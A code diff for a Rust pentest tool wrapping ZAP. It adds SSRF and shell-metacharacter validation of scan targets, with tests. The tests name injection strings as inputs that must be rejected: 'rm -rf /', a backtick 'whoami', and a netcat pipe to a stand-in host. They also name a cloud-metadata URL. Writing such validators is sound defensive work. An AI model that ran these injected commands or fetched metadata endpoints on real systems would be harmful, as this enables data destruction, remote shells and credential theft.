@@ -17,6 +17,7 @@ use pentest_core::tools::{
     execute_timed_with_provenance, ExternalDependency, ParamType, PentestTool, Platform,
     ToolCategory, ToolContext, ToolParam, ToolResult, ToolSchema,
 };
+use pentest_core::url_validation::{target_validation_mode, validate_url, ValidationMode};
 use pentest_platform::{get_platform, CommandExec};
 use serde_json::{json, Value};
 use std::time::Duration;
@@ -83,7 +84,7 @@ impl PentestTool for ZapTool {
             let platform = get_platform();
 
             let target = param_str_or(&params, "target", "");
-            let target = validate_url(&target)?;
+            let target = validate_target(&target, target_validation_mode())?;
             let scan_type = param_str_or(&params, "scan_type", "baseline");
             let timeout_secs = param_u64(&params, "timeout", 300);
 
@@ -153,9 +154,32 @@ impl PentestTool for ZapTool {
     }
 }
 
-/// Validate that the target is a well-formed http(s) URL and contains no shell
-/// metacharacters. Returns the normalized URL string.
-fn validate_url(raw: &str) -> Result<String> {
+/// Two-layer target validation for the zap tool (#311).
+///
+/// 1. [`sanitize_target_url`] — a local scheme + shell-metacharacter pre-check.
+/// 2. The SHARED SSRF guard [`pentest_core::url_validation::validate_url`],
+///    which classifies the resolved IP and blocks link-local / cloud-metadata /
+///    private ranges per `mode`.
+///
+/// zap was previously the only *fetching* web tool that skipped layer 2, so it
+/// would scan `169.254.169.254` regardless of `PENTEST_ALLOW_PRIVATE_IPS`; the
+/// sibling web tools (nikto/ffuf/dirb/gobuster) all gate this way. Extracted as
+/// a pure, mode-parameterized helper so the wiring itself is unit-testable
+/// (the production `execute` path only ever gets `Development` in debug builds,
+/// which would mask the guard).
+fn validate_target(raw: &str, mode: ValidationMode) -> Result<String> {
+    let pre = sanitize_target_url(raw)?;
+    validate_url(&pre, mode, None)
+}
+
+/// Defense-in-depth pre-check: the target must be a well-formed http(s) URL and
+/// contain no shell metacharacters. Returns the trimmed URL string.
+///
+/// This does NOT perform SSRF/IP classification — that is layer 2 in
+/// [`validate_target`]. Kept as a separate layer so a bad scheme or an injected
+/// metacharacter is rejected with a specific message before DNS resolution, and
+/// so the metachar guard survives even if the shared call is ever refactored.
+fn sanitize_target_url(raw: &str) -> Result<String> {
     let url = raw.trim();
     if url.is_empty() {
         return Err(pentest_core::error::Error::InvalidParams(
@@ -255,29 +279,77 @@ mod tests {
     use super::*;
 
     #[test]
-    fn validate_url_accepts_http_and_https() {
+    fn sanitize_target_url_accepts_http_and_https() {
         assert_eq!(
-            validate_url("https://app.example.com").unwrap(),
+            sanitize_target_url("https://app.example.com").unwrap(),
             "https://app.example.com"
         );
+        // The pre-check only normalizes shape; it does NOT judge the IP. The
+        // shared guard (run by the caller) is what blocks private/metadata
+        // ranges — see zap_blocks_metadata_via_shared_guard below.
         assert_eq!(
-            validate_url(" http://10.0.0.5:8080/ ").unwrap(),
+            sanitize_target_url(" http://10.0.0.5:8080/ ").unwrap(),
             "http://10.0.0.5:8080/"
         );
     }
 
     #[test]
-    fn validate_url_rejects_non_http() {
-        assert!(validate_url("app.example.com").is_err());
-        assert!(validate_url("ftp://x").is_err());
-        assert!(validate_url("").is_err());
+    fn sanitize_target_url_rejects_non_http() {
+        assert!(sanitize_target_url("app.example.com").is_err());
+        assert!(sanitize_target_url("ftp://x").is_err());
+        assert!(sanitize_target_url("").is_err());
     }
 
     #[test]
-    fn validate_url_rejects_shell_metacharacters() {
-        assert!(validate_url("https://x.com; rm -rf /").is_err());
-        assert!(validate_url("https://x.com`whoami`").is_err());
-        assert!(validate_url("https://x.com|nc evil 4444").is_err());
+    fn sanitize_target_url_rejects_shell_metacharacters() {
+        assert!(sanitize_target_url("https://x.com; rm -rf /").is_err());
+        assert!(sanitize_target_url("https://x.com`whoami`").is_err());
+        assert!(sanitize_target_url("https://x.com|nc evil 4444").is_err());
+    }
+
+    // #311: zap must run the SHARED SSRF guard, not just its local metachar
+    // pre-check. These exercise `validate_target` (the composed wiring the tool
+    // actually calls), NOT the shared guard directly — so a revert of layer 2
+    // inside `validate_target` turns them red. Guard-verified by mutation:
+    // neutering the `validate_url` call in `validate_target` fails these.
+
+    #[test]
+    fn zap_blocks_metadata_via_shared_guard() {
+        // The cloud-metadata service passes the local pre-check (well-formed
+        // http, no metachars) but `validate_target` must refuse it in both the
+        // default Production mode and the relaxed PrivateNetwork mode, because
+        // the shared guard classifies 169.254.169.254 as link-local.
+        let metadata = "http://169.254.169.254/latest/meta-data/";
+        assert!(
+            sanitize_target_url(metadata).is_ok(),
+            "pre-check alone must NOT be what blocks it"
+        );
+        assert!(
+            validate_target(metadata, ValidationMode::Production).is_err(),
+            "metadata must be blocked in Production"
+        );
+        assert!(
+            validate_target(metadata, ValidationMode::PrivateNetwork).is_err(),
+            "metadata must be blocked in PrivateNetwork too"
+        );
+    }
+
+    #[test]
+    fn zap_blocks_private_ip_in_production() {
+        // Behavior change (#311): before this fix the tool accepted any RFC-1918
+        // target unconditionally. Now `validate_target` blocks it in Production
+        // (release default); an operator must set PENTEST_ALLOW_PRIVATE_IPS=true
+        // to scan private targets, matching nikto/ffuf/dirb/gobuster.
+        let private = "http://10.0.0.5:8080/";
+        assert!(sanitize_target_url(private).is_ok());
+        assert!(
+            validate_target(private, ValidationMode::Production).is_err(),
+            "RFC-1918 must be blocked in Production"
+        );
+        assert!(
+            validate_target(private, ValidationMode::PrivateNetwork).is_ok(),
+            "RFC-1918 must be allowed once the private-IP opt-in is on"
+        );
     }
 
     #[test]
